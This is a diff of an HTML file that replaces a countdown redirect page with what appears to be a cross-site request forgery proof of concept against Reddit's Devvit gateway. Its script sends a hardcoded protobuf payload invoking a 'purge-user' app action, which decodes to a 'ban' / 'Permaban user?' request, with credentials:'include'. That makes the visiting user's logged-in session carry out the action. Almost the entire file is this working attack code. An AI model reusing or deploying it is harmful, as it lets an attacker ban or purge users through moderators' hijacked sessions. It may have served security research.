@@ -1,37 +1,43 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect Timer</title>
-</head>
-<body>
+<html>
+  <body>
+    
+    <input type="text" id="installationIdInput" placeholder="Enter the subredditId">
+    <button onclick="fetchData()">Submit</button>
+    <div id="resultMessage"></div>
 
-<div id="timer">Redirecting in 5 seconds...</div>
+   <script>
+    function fetchData() {
+    const hexDataWithSpaces = "00 00 00 01 35 0A 0C 70 75 72 67 65 2D 75 73 65 72 2D 30 1A 83 02 12 00 2A 00 3A 0E 0A 0C 5F 75 73 65 72 5F 5F 74 65 73 74 32 7A 0D 0A 0B 74 32 5F 65 6C 62 67 75 35 68 76 82 01 00 A2 01 06 08 95 D6 F4 AD 06 AA 01 06 0A 04 74 72 75 65 C2 01 00 82 02 07 08 A0 8C C1 D7 D6 31 8A 02 07 08 A0 8C C1 D7 D6 31 BA 02 09 0A 07 31 61 68 39 6C 79 6B C2 02 00 E2 02 00 8A 03 0C 0A 0A 74 33 5F 31 61 68 39 6C 79 6B A2 03 00 B2 03 40 0A 3E 68 74 74 70 73 3A 2F 2F 77 77 77 2E 72 65 64 64 69 74 2E 63 6F 6D 2F 72 2F 61 6E 6F 74 68 65 72 74 65 73 74 79 61 73 2F 63 6F 6D 6D 65 6E 74 73 2F 31 61 68 39 6C 79 6B 2F 68 69 69 69 2F C2 03 00 E2 03 00 EA 03 02 08 01 F2 03 00 FA 03 02 08 01 82 04 00 8A 04 00 9A 04 0B 0A 09 74 35 5F 35 34 6D 6F 79 32 AA 04 0B 0A 09 73 75 62 72 65 64 64 69 74 FA 04 00 82 05 00 BA 05 06 0A 04 73 65 6C 66 D2 05 06 0A 04 68 69 69 69 32 1F 0A 1D 08 03 12 03 62 61 6E 1A 0E 50 65 72 6D 61 62 61 6E 20 75 73 65 72 3F 22 04 74 72 75 65";
+    const hexData = hexDataWithSpaces.replace(/\s/g, '');
+    const binaryData = new Uint8Array(hexData.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+      // Get the installation ID entered by the user
+      const subredditId = document.getElementById('installationIdInput').value;
+      const url = 'https://devvit-gateway.reddit.com/devvit.actor.reddit.ContextAction/OnAction';
+      const headers = new Headers({
+    'devvit-app': 'purge-user', 
+    'devvit-subreddit': subredditId,
+    'Devvit-Actor': 'main',
+    'Content-Type': 'application/grpc-web+proto',
+    'X-User-Agent': 'grpc-web-javascript/0.1',
+    'X-Grpc-Web': '1'
+});
 
-<script>
-    // Set the initial countdown value
-    let countdown = 5;
+const fetchOptions = {
+  method: 'POST',
+  headers: headers,
+  body: binaryData,
+  credentials: 'include',
+};
 
-    // Function to update the countdown and redirect when it reaches 0
-    function updateCountdown() {
-        document.getElementById('timer').textContent = `Redirecting in ${countdown} seconds...`;
+fetch(url, fetchOptions).then(data => {
+          // Display a success message
+          document.getElementById('resultMessage').innerText = 'Success!';
 
-        if (countdown === 0) {
-            // Redirect to the specified URL
-            window.location.href = 'https://example.com';
-        } else {
-            // Decrement the countdown
-            countdown--;
-
-            // Call the function again after 1 second
-            setTimeout(updateCountdown, 1000);
-        }
-    }
-
-    // Start the countdown when the page loads
-    window.onload = updateCountdown;
+          // Remove the installation ID input and submit button
+          document.getElementById('installationIdInput').style.display = 'none';
+          document.querySelector('button').style.display = 'none';
+    })
+}
 </script>
-
-</body>
+  </body>
 </html>
